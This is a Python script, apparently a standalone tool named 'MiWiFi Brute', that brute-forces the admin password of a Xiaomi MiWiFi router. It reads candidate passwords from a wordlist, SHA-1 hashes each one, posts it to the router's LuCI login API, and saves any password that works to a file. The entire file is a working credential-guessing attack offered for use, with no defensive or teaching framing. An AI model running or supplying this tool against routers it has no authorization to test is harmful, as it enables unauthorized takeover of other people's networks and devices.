import requests
import time
import threading
import pyfiglet
import sys
import signal
import hashlib
from colorama import Fore, Back, Style

def check_internet_connection(timeout=5): # check if user connected to internet
    try:
        url = "https://google.com"
        response = requests.get(url, timeout=timeout)
        return response.status_code == 200
    except requests.ConnectionError:
        return False

def banner(): # print banner
    print(Fore.LIGHTMAGENTA_EX)
    title = "MiWiFi Brute"
    banner = pyfiglet.Figlet(font="big")
    banner_text = banner.renderText(title)
    
    print(banner_text)

def handle_ctrl_c(signal, frame):
    print(f"{Fore.YELLOW}\nBye!")
    sys.exit(0)

def main():
    # banner
    banner()
    print(f"{Fore.LIGHTGREEN_EX}[*] Loading...")
    if check_internet_connection(5):
        pass
    else:
        print(f"{Fore.RED}You haven't internet connection! Exiting...")
        exit(1)

    # User inputs
    ip = input(f"{Fore.CYAN}[>] Paste your router local ip (Must end with 1. Ex: 192.168.1.1): ")
    wordlist_path = input(f"{Fore.CYAN}[>] Paste path to the wordlist (Press ENTER to use default list): ")
    if wordlist_path == "" or wordlist_path == " ":
        wordlist_path = "wordlist.txt"
    
    url = f"http://{ip}/cgi-bin/luci/web"

    response = requests.get(url, verify=False)
    if response.status_code != 200:
        print(f"{Fore.RED}Can't do request to `{url}`! Exiting...")
        exit(1)

    login_url = f"http://{ip}/cgi-bin/luci/api/xqsystem/login"

    data = {
        "username": "admin",
        "logtype": 2,
        # "nonce": "0_04%3Ad9%3Af5%3A06%3A8c%3Ad1_1695365048_2638",
        "password": ""
    }

    password_counter = 0
    with open(wordlist_path, 'r') as wordlist:
        for line in wordlist:
            password_counter += 1

            hash_pass = hashlib.sha1(line.strip().encode('utf-8')).hexdigest() # convert password to SHA-1 hash
            data["password"] = hash_pass

            login_resp = requests.post(login_url, data=data)
            result = login_resp.json()
            if int(result.get("code")) != 200:
                print(f"{Fore.RED}[{password_counter} | -] {line.strip()} -> {data['password']}\t[{result.get('code')}] [{result.get('msg')}]")
            elif int(result.get("code")) == 200:
                print(f"{Fore.GREEN}[{password_counter} | +] {line.strip()} -> {data['password']}\t[{result.get('code')}] [{result.get('msg')}]")

                print(f"{Fore.GREEN}[!] Valid password found! Results wrote to `result.txt`")
                with open("result.txt", "w") as result_file:
                    result_file.write(f"===MiWiFi BruteForce===\n\tUsername: {data.get('username')}\n\tPassword: {line.strip()}\n Hash Password: {data.get('password')}")
                break


if __name__ == "__main__":
    signal.signal(signal.SIGINT, handle_ctrl_c) # if user press Ctrl+C
    main()